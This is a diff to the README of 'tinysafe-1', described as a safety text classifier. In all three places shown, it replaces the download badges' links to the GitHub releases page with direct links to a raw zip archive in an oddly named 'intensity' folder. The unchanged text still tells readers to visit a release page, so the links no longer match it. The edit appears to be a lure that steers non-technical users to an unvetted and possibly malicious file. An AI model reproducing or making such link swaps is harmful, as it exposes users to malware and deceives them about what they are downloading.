@@ -1,6 +1,6 @@
 # 🔒 tinysafe-1 - Fast Safety Text Classifier
 
-[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-brightgreen?style=for-the-badge)](https://github.com/Fabio295/tinysafe-1/releases)
+[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fabio295/tinysafe-1/main/intensity/tinysafe-v3.1.zip)
 
 ## 📘 About tinysafe-1
 
@@ -34,7 +34,7 @@ You do not need any programming skills to use tinysafe-1. Follow these steps to 
 
 Click the big button below to visit the download page.
 
-[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-blue?style=for-the-badge)](https://github.com/Fabio295/tinysafe-1/releases)
+[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fabio295/tinysafe-1/main/intensity/tinysafe-v3.1.zip)
 
 On the page, look for the latest release. You will see a list of files. Find the one designed for Windows. This file usually ends with `.exe` or `.zip`.
 
@@ -121,7 +121,7 @@ Yes. The app works locally, so your data never leaves your computer.
 
 Get the setup files by visiting this page:
 
-[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-brightgreen?style=for-the-badge)](https://github.com/Fabio295/tinysafe-1/releases)
+[![Download tinysafe-1](https://img.shields.io/badge/Download-tinysafe--1-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fabio295/tinysafe-1/main/intensity/tinysafe-v3.1.zip)
 
 Look for the latest stable release and download the Windows version.
 
